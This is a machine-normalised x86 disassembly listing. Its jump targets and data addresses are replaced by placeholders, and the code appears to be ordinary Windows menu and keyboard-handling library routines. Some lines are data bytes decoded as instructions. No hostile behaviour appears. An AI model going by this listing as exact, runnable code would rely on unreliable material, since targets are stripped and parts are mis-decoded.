test eax eax
jl r-xdata
push ebp
call sub_45fa20
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
cmp [ eax + 0x34 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4055f0
mov eax [ ebp - 0x2c ]
call sub_4055f0
mov eax [ ebp - 0x14 ]
call sub_4055f0
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
inc eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45fa20
pop ecx
lea eax [ ebp - 0x20 ]
call sub_406a60
call sub_407400
cmp ebx eax
jle r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
mov eax [ eax + 0x34 ]
lea edx [ ebp - 0x3c ]
call sub_4624a8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x1c ]
call sub_410d30
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x34
mov edx [ ebp - 0x20 ]
call sub_4070a8
inc [ ebp - 0x30 ]
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_417b94
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov esi [ ebp - 0x20 ]
test esi esi
je r-xdata
dec [ ebp - 0x30 ]
cmp [ ebp - 0x30 ] 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x1c ]
call sub_417b94
test eax eax
je r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
push eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
mov ecx [ eax + 0x34 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc esi
mov [ ebp - 0x30 ] 0x0
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
push ebp
mov eax [ ebp - 0x1c ]
call sub_45f9f0
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_417b94
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
call sub_4070fc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ebx eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx ebx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x78 ]
inc [ ebp - 0x30 ]
dec esi
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_4077d0
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x1c ]
call sub_410d30
push ebp
mov eax [ ebp - 0x1c ]
call sub_45f9f0
pop ecx
test al al
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
call sub_406a50
mov esi eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
add eax 0x34
push eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
mov eax [ eax + 0x34 ]
lea edx [ ebp - 0x40 ]
call sub_46238c
mov edx [ ebp - 0x40 ]
pop eax
call sub_4070a8
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
push eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_45efec
mov ecx [ eax + 0x34 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea edx [ ebp - 0x20 ]
mov ecx ebx
mov eax r-xdata
call sub_407914
lea eax [ ebp - 0x20 ]
mov ecx ebx
mov edx [ ebp - 0x1c ]
call sub_45faa4
jmp r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x18 ]
call sub_4077d0
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_45faa4
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
call sub_406a50
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
xchg edx eax
call sub_4078a0
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
call sub_406a50
sub_4601c3
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi eax
mov dl 0x1
mov eax esi
call sub_45fc78
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_46021f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4602e3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46238c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4070fc
mov eax edi
call sub_45efdc
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4602ea
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_45efec
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_45efec
mov eax [ eax + 0x34 ]
lea edx [ ebp - 0x14 ]
call sub_46238c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_411254
test eax eax
sete al
test al al
je r-xdata
sub_4602f4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov ebx edx
mov esi eax
cmp esi [ ebp + 0x64 ]
je r-xdata
test bl bl
je r-xdata
mov eax [ rw-data ]
call sub_45b148
mov eax ebp
call sub_45f044
mov ebx eax
mov eax esi
call sub_45efdc
dec eax
cmp ebx eax
jge r-xdata
mov eax ebp
call sub_45f044
test eax eax
jle r-xdata
mov eax ebp
call sub_45f044
mov edi eax
add edi 0x2
mov eax ebp
call sub_45f044
inc eax
push eax
call sub_462270
mov ecx eax
mov eax esi
pop edx
call sub_45f168
mov eax ebp
call sub_45f044
mov edx eax
inc edx
mov eax esi
call sub_45efec
call sub_460200
test al al
je r-xdata
mov eax ebp
call sub_45f044
mov edi eax
mov eax ebp
call sub_45f044
push eax
call sub_462270
mov ecx eax
mov eax esi
pop edx
call sub_45f168
jmp r-xdata
mov eax ebp
call sub_45f044
mov edx eax
dec edx
mov eax esi
call sub_45efec
call sub_460200
test al al
je r-xdata
mov eax ebp
call sub_45f044
mov edi eax
add edi 0x2
mov eax ebp
call sub_45f044
mov edx eax
inc edx
mov eax esi
call sub_45efec
mov dl 0x1
call sub_45f024
jmp r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_45f044
mov edi eax
dec edi
mov eax ebp
call sub_45f044
mov edx eax
dec edx
mov eax esi
call sub_45efec
mov dl 0x1
call sub_45f024
jmp r-xdata
sub_460418
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_45efdc
test eax eax
jne r-xdata
mov eax ebx
call sub_45efdc
mov edx eax
dec edx
mov eax ebx
call sub_45efec
mov ecx eax
xor edx edx
mov eax ebx
call sub_4602f4
mov esi eax
call sub_462270
mov edx eax
mov eax ebx
call sub_45f364
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_46045c
push ebx
push esi
mov ebx eax
xor esi esi
mov eax ebx
call sub_45efdc
test eax eax
jne r-xdata
xor edx edx
mov eax ebx
call sub_45efec
mov ecx eax
mov dl 0x1
mov eax ebx
call sub_4602f4
mov esi eax
call sub_462270
mov edx eax
mov eax ebx
call sub_45f364
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_460498
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45efdc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45efdc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
movzx eax [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_460644
test al al
je r-xdata
mov eax esi
call sub_45efdc
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45efec
call sub_460200
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45efec
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45efec
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45efec
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45efec
call sub_460200
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45efec
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45efec
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45efec
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45efec
call sub_460200
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4605f0
push ebx
push esi
mov esi eax
mov dl 0x1
mov eax esi
call sub_460498
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_460614
push ebx
mov ebx eax
movzx eax [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_460614
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_460644
push ebx
mov ebx eax
movzx eax [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_460644
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_460674
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45bba0
mov esi eax
mov [ ebx + 0x38 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x3c ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_43c14c
mov eax [ ebx + 0x38 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_461684
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_460720
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
call sub_4055f0
mov eax [ esi + 0x44 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4607b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0xac ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45efdc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45efec
call sub_4607b0
pop ecx
test al al
je r-xdata
sub_46084c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4607b0
mov edx [ eax + 0x38 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45b69c
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46087c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_46084c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_4620c0
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_4608ec
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_46084c
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x48 ]
mov bl 0x1
sub_460908
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_46084c
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x48 ]
xor edx edx
mov eax edi
call sub_45fc78
mov ebx eax
xor edx edx
mov eax edi
call sub_460498
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45f514
mov eax [ esi + 0x38 ]
call sub_45f514
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45c150
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x29e ] 0x2
jne r-xdata
cmp edi [ ebx + 0x2c0 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x37c ]
push eax
call __imp_SendMessageW
test eax eax
je r-xdata
mov eax ebx
call sub_479ce0
push eax
call DrawMenuBar
sub_4609e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460b1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
call GetKeyboardLayoutNameW
mov dl 0x1
mov eax [ r-xdata ]
call sub_444aac
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_460af3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx 0x80000002
mov eax [ ebp - 0xc ]
call sub_444b94
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0x20 ]
mov ecx 0xa
call sub_407290
mov ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
mov edx r-xdata
call sub_407564
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_444e10
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460afa
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_44570c
mov edx 0x8000
mov eax [ ebp - 0x4 ]
call sub_418b3c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_460ad6
push [ fs : edx ]
mov [ fs : edx ] esp
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40bb70
mov ebx eax
call ebx
movzx eax [ eax + 0x28 ]
and ax 0x1
cmp ax 0x1
sete [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call FreeLibrary
retn
sub_460bec
push ebx
xor ebx ebx
push 0xa5
call GetKeyState
test ax ax
jge r-xdata
mov eax ebx
pop ebx
retn
push 0x0
call GetKeyboardLayout
mov ebx eax
cmp ebx [ rw-data ]
je r-xdata
movzx ebx [ rw-data ]
call sub_4609e4
mov [ rw-data ] ebx
sub_460c28
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
test bx bx
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add bx 0x2000
test [ esp + 0xb ] 0x20
je r-xdata
add bx 0x4000
add bx 0x8000
sub_460c88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_460c88
pop ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_460dae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_46084c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45f514
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_460c78
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_460ddc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov [ ebp - 0xc ] eax
xor ebx ebx
call sub_460bec
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_460c28
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4409b8
xor edx edx
push ebp
push sub_460eaf
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4409b8
xor edx edx
push ebp
push sub_460e84
push [ fs : edx ]
mov [ fs : edx ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_460c88
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460eb6
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_46084c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_460eb6
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov bl 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460ed8
push ebp
mov ebp esp
add esp 0xffffff30
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
mov esi eax
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x8 ] 0x50
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x30 ] 0x30
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jle r-xdata
lea eax [ ebp - 0xd0 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_460fd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x30 ]
push eax
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoW
test eax eax
je r-xdata
mov [ ebp - 0x30 ] 0x2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax ebx
call sub_4612dc
mov edx [ ebp - 0x28 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
jne r-xdata
mov eax ebx
call sub_4612dc
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ ebp - 0x28 ]
and edx 0xffff9fff
or eax edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] 0x10
lea eax [ ebp - 0x30 ]
push eax
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoW
test eax eax
je r-xdata
call sub_4061a4
jmp r-xdata
mov eax [ ebx + 0x3c ]
push eax
call DrawMenuBar
sub_460fe0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x400 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff6
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
sar eax 0x1
jns r-xdata
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x404 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4615b4
mov eax ebx
call sub_412570
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
mov edi eax
test di 0x2
je r-xdata
adc eax 0x0
